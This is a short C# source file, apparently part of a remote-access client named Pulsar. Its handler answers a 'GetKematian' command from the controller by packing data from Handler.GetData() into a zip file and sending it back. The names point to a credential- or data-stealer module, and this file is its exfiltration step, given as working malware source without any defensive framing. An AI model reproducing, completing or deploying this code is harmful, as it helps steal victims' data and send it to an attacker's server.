using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Client.Kematian;
using Pulsar.Common.Messages.Monitoring.Kematian;
using Pulsar.Common.Messages.other;

namespace Pulsar.Client.Messages
{
    public class KematianHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetKematian;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKematian msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetKematian message)
        {
            byte[] zipFile = Handler.GetData();
            client.Send(new GetKematian { ZipFile = zipFile });
        }
    }
}
